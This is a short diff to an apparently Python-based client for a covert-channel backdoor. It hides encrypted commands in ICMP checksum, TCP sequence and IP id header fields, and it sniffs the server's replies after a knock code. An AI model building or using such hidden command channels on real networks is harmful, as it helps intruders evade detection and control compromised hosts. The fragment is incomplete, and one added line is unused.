@@ -34,8 +34,7 @@ def startClient(serverIP, proto, intf):
 			sendCommand(utils.encryptData(comm))
 		else:
 			client.running = False
-
-	listenThread.stop()
+			sys.exit()
 
 def sendCommand(command):
 	# send your command, make sure you set the password in the ip id field (ipHeader[3])
@@ -51,17 +50,16 @@ def sendCommand(command):
 			proto = ICMP(chksum=ord(c))
 		packet = packet/proto
 		send(packet)
-		# packet.show()
-	print "sent all packets"
-	print pswd
 
+	proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord('\n'))
 
 def recvThread():
 	# wait for the knock code
 	# once you get the knock code, send something back, then begin listening for stuff
 	# for now, just print data
 	cap = pcapy.open_live(interface, 65536, 1, 0)
-	cap.setfilter(config.protocol)
+	fltr = "ip src " + server
+	cap.setfilter(fltr)
 
 	while(client.running):
 		(header, packet) = cap.next()
